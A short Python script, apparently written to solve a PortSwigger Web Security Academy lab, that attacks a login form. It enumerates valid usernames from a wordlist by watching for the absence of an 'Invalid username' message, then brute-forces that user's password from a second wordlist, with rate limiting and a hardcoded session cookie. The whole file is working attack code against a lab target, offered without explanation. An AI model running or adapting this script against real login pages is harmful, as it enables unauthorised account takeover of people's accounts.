from requests import post
from pathlib import Path
from ratelimit import limits, RateLimitException, sleep_and_retry

ONE_MINUTE = 60
MAX_CALLS_PER_MINUTE = 120
url = 'https://0a3e001f0401142ec02f7db9002000b7.web-security-academy.net/login'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://0a3e001f0401142ec02f7db9002000b7.web-security-academy.net/',

}
cookies = {
    'session': 'EaPnUa21exELsUbGQqJUqSUjiFfRbwyF'
}

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_user_call(url, line, headers, cookies):
    return post(
                url=url, 
                data={'username': line, 'password': 'asdf'},
                headers=headers,
                cookies=cookies
            )

def user_enum(url, user_file_list, headers, cookies):
    with Path(user_file_list).open('r') as file:
        lines = file.readlines()
        for line in lines:
            res = make_user_call(url, line.strip(), headers, cookies)
            if 'Invalid username' not in res.text:
                return line
@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_pass_call(url, username, password, headers, cookies):
    return post(
            url=url,
            data={'username': username, 'password': password},
            headers=headers,
            cookies=cookies
        )

def pass_enum(url, username, pass_file_list, headers, cookies):
    with Path(pass_file_list).open('r') as file:
        lines = file.readlines()
        for line in lines:
            res = make_pass_call(url, username, line.strip(), headers, cookies)
            if 'Incorrect password' not in res.text:
                return line

def main():
    user = user_enum(
            url,
            './usernames.txt',
            headers,
            cookies
    )

    print(user)
    password = pass_enum(
        url,
        user.strip(),
        './passwords.txt',
        headers=headers,
        cookies=cookies
    )
    print(password)



if __name__ == "__main__":
    main()